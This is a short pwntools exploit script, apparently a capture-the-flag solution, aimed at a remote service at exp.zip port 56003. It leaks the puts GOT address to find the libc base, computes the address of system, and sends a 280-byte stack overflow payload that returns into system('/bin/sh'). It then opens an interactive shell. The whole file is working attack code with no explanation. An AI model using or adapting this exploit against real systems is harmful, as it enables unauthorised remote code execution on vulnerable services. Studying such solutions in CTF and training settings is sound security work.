from pwn import *

r = remote("exp.zip", 56003)

puts_got=b'404018'
puts_libc_off=b'80ed0'
sys_libc_off = b'50d60'


r.recvuntil(b"Name:")

r.send(b'/bin/sh')

r.recvuntil(b"(in hex) :")

r.sendline(puts_got)

r.recvuntil(b'The content of the address : ')

puts_addr = r.recvline()

base_addr = int(puts_addr,16) - int(puts_libc_off,16)

sys_addr = base_addr + int(sys_libc_off,16) 


payload = b"a"*280 + p64(0x40139C) + p64(sys_addr)


r.sendline(payload)

r.interactive()

